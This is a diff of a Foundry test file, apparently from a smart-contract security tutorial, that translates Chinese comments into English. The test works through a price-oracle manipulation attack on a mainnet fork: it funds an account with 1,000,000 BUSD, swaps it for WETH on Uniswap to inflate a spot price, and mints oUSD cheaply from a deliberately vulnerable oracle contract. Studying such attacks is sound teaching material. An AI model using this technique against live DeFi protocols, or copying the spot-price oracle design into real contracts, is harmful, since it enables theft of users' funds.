@@ -1,4 +1,5 @@
 // SPDX-License-Identifier: MIT
+// english translation by yzhX
 pragma solidity ^0.8.4;
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
@@ -17,30 +18,30 @@ contract OracleTest is Test {
 
     function setUp() public {
         MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
-        // fork指定区块
-        vm.createSelectFork(MAINNET_RPC_URL,16060405);
+        // Specify the forked block
+        vm.createSelectFork(MAINNET_RPC_URL, 16060405);
         router = IUniswapV2Router(ROUTER);
         ousd = new oUSD();
     }
 
     //forge test --match-test  testOracleAttack  -vv
     function testOracleAttack() public {
-        // 攻击预言机
-        // 0. 操纵预言机之前的价格
+        // Attack the oracle
+        // 0. Get the price before manipulating the oracle
         uint256 priceBefore = ousd.getPrice();
         console.log("1. ETH Price (before attack): %s", priceBefore); 
-        // 给自己账户 1000000 BUSD
+        // Give yourself 1,000,000 BUSD
         uint busdAmount = 1_000_000 * 10e18;
         deal(BUSD, alice, busdAmount);
-        // 2. 用busd买weth，推高顺时价格
+        // 2. Buy WETH with BUSD to manipulate the oracle
         vm.prank(alice);
         busd.transfer(address(this), busdAmount);
         swapBUSDtoWETH(busdAmount, 1);
         console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
-        // 3. 操纵预言机之后的价格
+        // 3. Get the price after manipulating the oracle
         uint256 priceAfter = ousd.getPrice();
         console.log("3. ETH price (after attack): %s", priceAfter); 
-        // 4. 铸造oUSD
+        // 4. Mint oUSD
         ousd.swap{value: 1 ether}();
         console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18); 
     }
